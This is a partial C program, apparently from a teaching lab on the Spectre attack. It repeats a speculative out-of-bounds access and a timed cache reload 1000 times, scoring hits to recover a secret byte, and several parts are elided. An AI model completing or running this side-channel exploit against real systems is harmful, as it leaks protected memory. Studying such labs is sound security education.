static int scores[256];
void reloadSideChannelImproved()
{
......
for (i = 0; i < 256; i++) {
......
if (time2 <= CACHE_HIT_THRESHOLD)

scores[i]++; /* if cache hit, add 1 for this value */
}
}
void spectreAttack(size_t index_beyond)
{
... omitted: same as that in SpectreAttack.c ...
}
int main() {
int i;
uint8_t s;
size_t index_beyond = (size_t)(secret - (char*)buffer);
flushSideChannel();
for(i=0;i<256; i++) scores[i]=0;
for (i = 0; i < 1000; i++) {
printf("*****\n"); ¿
spectreAttack(index_beyond);
usleep(10); ¡
reloadSideChannelImproved();
}
int max = 0;
for (i = 0; i < 256; i++){
if(scores[max] < scores[i])
max = i;
}
printf("Reading secret value at index %ld\n", index_beyond);
printf("The secret value is %d(%c)\n", max, max);
printf("The number of hits is %d\n", scores[max]);
return (0);
}